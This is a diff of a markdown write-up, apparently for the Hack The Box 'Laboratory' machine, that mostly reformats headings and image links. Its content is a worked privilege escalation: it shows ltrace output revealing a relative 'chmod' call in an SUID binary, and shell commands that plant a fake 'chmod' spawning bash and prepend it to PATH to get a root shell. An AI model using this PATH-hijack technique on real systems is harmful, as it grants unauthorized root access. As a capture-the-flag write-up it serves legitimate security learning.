@@ -1,9 +1,11 @@
-Look at the SUID binaries
-![](Screen-shot/SUID%20docker-security.png)
+# 20-Privesc
 
-The binary is owned by `dexter` and we can executed as `root` 
+Look at the SUID binaries ![](https://github.com/quangtien0101/HTB_Laboratory/tree/61be6c501b6c846246628c926fa3d7dcd963be87/Laboratory/Screen-shot/SUID%20docker-security.png)
 
-### ltrace
+The binary is owned by `dexter` and we can executed as `root`
+
+## ltrace
+
 ```bash
 dexter@laboratory:~$ ltrace /usr/local/bin/docker-security
 setuid(0)                                                                                                            = -1
@@ -22,6 +24,7 @@ system("chmod 660 /var/run/docker.sock"chmod: changing permissions of '/var/run/
 We see that once we are root, we can hijack the `chmod` binary since it doesn't use the absolute path
 
 create a `chmod` executable which essentially start a `bash` shell
+
 ```bash
 #!/bin/bash
 echo "chmod hijack"
@@ -34,8 +37,8 @@ dexter@laboratory:/dev/shm$ chmod +x chmod
 dexter@laboratory:/dev/shm$ export PATH=$(pwd):$PATH
 dexter@laboratory:/dev/shm$ /usr/local/bin/docker-security
 chmod hijack
-root@laboratory:/dev/shm# cat chmod 
-
+root@laboratory:/dev/shm# cat chmod
 ```
 
-![](Screen-shot/Gain%20root.png)
+![](https://github.com/quangtien0101/HTB_Laboratory/tree/61be6c501b6c846246628c926fa3d7dcd963be87/Laboratory/Screen-shot/Gain%20root.png)
+
